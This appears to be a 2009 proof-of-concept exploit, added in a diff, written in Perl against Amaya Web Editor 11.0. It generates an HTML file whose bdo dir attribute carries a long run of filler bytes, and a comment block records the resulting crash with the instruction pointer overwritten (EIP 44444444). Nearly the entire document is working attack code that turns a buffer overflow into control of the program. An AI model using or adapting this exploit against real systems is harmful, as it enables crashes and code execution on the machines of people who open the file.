@@ -1,0 +1,34 @@
+#!/usr/bin/perl -w
+# Amaya Web Editor <= 11.0 Remote Buffer Overflow P0c
+ 
+# By Mountassif Moad (Stack)
+# Here D : http://www.w3.org/Amaya/Distribution/amaya-WinXP-11.0.exe
+# EAX 00000001
+# ECX 0F866A64
+# EDX 0083AA64 amaya.0083AA64
+# EBX 00000000
+# ESP 0012D080
+# EBP 00000006
+# ESI 0B425D00
+# EDI 0085AD9C ASCII "src"
+# EIP 44444444
+
+print "===================================================================== \n";
+print "Author : Stack            \n";
+print "===================================================================== \n";
+my $code ="<html>"."\n".
+         '<bdo dir="'."\n";
+my $bof = "\x41" x 160;
+my $bof2 = "\x43" x 8;
+my $bof3 = "\x44" x 4;
+my $coding ='">'."\n".
+             "Heap</bdo>"."\n".
+            "</html>";
+my $file="St_.html";
+$exploit = $code.$bof.$bof2.$bof3.$coding;
+open(my $FILE, ">>$file") or die "Cannot open $file: $!";
+print $FILE $exploit ;
+close($FILE);
+print "$file has been created \n";
+
+# milw0rm.com [2009-01-29]
